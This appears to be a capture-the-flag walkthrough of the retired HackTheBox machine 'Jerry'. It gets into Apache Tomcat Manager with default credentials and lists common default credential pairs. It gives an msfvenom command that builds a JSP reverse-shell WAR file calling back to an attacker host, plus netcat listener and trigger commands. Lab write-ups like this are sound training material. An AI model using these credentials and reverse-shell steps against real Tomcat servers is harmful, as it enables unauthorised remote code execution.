# HackTheBox — Jerry

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Web Exploitation / Apache Tomcat  
**Status:** Retired  

---

## Summary

Jerry is a Windows machine running Apache Tomcat with default credentials enabled. The exploitation path is straightforward: log in to the Tomcat Manager with default creds, deploy a malicious WAR file containing a JSP reverse shell, and receive a SYSTEM-level shell — no privilege escalation required.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/jerry 10.10.10.95
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

Only one port open — Tomcat on 8080.

---

## Web Enumeration

Visiting `http://10.10.10.95:8080` shows the default Tomcat splash page.

Navigate to `/manager/html`:

```
http://10.10.10.95:8080/manager/html
```

A basic auth popup appears. Try common default credentials:

| Username | Password |
|----------|----------|
| admin | admin |
| tomcat | tomcat |
| admin | password |
| tomcat | s3cret |

**`tomcat:s3cret` works.**

---

## Exploitation

### Generating a Malicious WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -f war -o shell.war
```

### Deploying the WAR

1. In the Tomcat Manager, scroll to **"WAR file to deploy"**
2. Choose file → `shell.war` → Click **Deploy**

The app appears as `/shell` in the applications list.

### Triggering the Shell

```bash
# Start listener
nc -lvnp 4444

# Trigger
curl http://10.10.10.95:8080/shell/
```

**Shell lands as `NT AUTHORITY\SYSTEM`** — no privesc needed!

---

## Flags

Both flags are in a single file on this box:

```cmd
type C:\Users\Administrator\Desktop\flags\*
```

```
user.txt: [REDACTED]
root.txt: [REDACTED]
```

---

## Key Takeaways

- **Default credentials** are incredibly common on misconfigured enterprise software
- Tomcat Manager access = instant RCE via WAR file deployment
- WAR files are ZIP archives containing Java web apps — msfvenom can generate them easily
- Always check `/manager/html`, `/host-manager/html` on Tomcat instances
- A service running as SYSTEM means no privilege escalation is needed — you land at max privilege

---

## Common Tomcat Default Creds

| Username | Password |
|----------|----------|
| tomcat | tomcat |
| admin | admin |
| tomcat | s3cret |
| admin | manager |
| role1 | role1 |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| msfvenom | WAR payload generation |
| Browser | Manager panel access |
| netcat | Reverse shell listener |
